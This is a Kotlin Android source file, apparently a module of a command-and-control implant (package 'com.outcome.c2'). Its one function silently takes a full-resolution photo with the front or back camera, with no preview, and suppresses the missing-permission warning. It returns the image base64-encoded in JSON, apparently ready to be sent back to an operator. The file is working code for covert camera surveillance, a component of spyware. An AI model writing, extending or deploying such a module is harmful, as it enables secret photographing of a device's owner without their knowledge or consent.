package com.outcome.c2

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import org.json.JSONObject
import java.nio.ByteBuffer
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object Camera {

    fun capture(ctx: Context, facing: String): JSONObject {
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val wantFront = facing.equals("front", true)

        val cameraId = cm.cameraIdList.firstOrNull { id ->
            val chars = cm.getCameraCharacteristics(id)
            val lens = chars.get(CameraCharacteristics.LENS_FACING)
            (wantFront && lens == CameraCharacteristics.LENS_FACING_FRONT) ||
            (!wantFront && lens == CameraCharacteristics.LENS_FACING_BACK)
        } ?: return JSONObject().put("error", "camera_not_found")

        val chars = cm.getCameraCharacteristics(cameraId)
        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?: return JSONObject().put("error", "no_stream_config")
        val sizes = map.getOutputSizes(ImageFormat.JPEG)
        val size = sizes.maxByOrNull { it.width * it.height } ?: sizes[0]

        val thread = HandlerThread("cam").also { it.start() }
        val handler = Handler(thread.looper)
        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)

        val latch = CountDownLatch(1)
        var bytes: ByteArray? = null

        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buf: ByteBuffer = img.planes[0].buffer
                bytes = ByteArray(buf.remaining()).also { buf.get(it) }
            } finally {
                img.close()
                latch.countDown()
            }
        }, handler)

        var session: CameraCaptureSession? = null
        var device: CameraDevice? = null

        try {
            val devLatch = CountDownLatch(1)
            @Suppress("MissingPermission")
            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) { device = camera; devLatch.countDown() }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); devLatch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); devLatch.countDown() }
            }, handler)
            if (!devLatch.await(3, TimeUnit.SECONDS)) return JSONObject().put("error", "open_timeout")

            val cam = device ?: return JSONObject().put("error", "device_null")
            val sessLatch = CountDownLatch(1)
            cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: CameraCaptureSession) { session = s; sessLatch.countDown() }
                override fun onConfigureFailed(s: CameraCaptureSession) { sessLatch.countDown() }
            }, handler)
            if (!sessLatch.await(3, TimeUnit.SECONDS)) return JSONObject().put("error", "session_timeout")

            val sess = session ?: return JSONObject().put("error", "session_null")
            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(reader.surface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }.build()

            sess.capture(req, null, handler)
            latch.await(5, TimeUnit.SECONDS)

            val data = bytes ?: return JSONObject().put("error", "capture_timeout")
            val b64 = Base64.encodeToString(data, Base64.NO_WRAP)
            return JSONObject()
                .put("format", "jpeg")
                .put("facing", facing)
                .put("size", "${size.width}x${size.height}")
                .put("data_b64", b64)
        } finally {
            try { session?.close() } catch (_: Exception) {}
            try { device?.close() } catch (_: Exception) {}
            try { reader.close() } catch (_: Exception) {}
            thread.quitSafely()
        }
    }
}
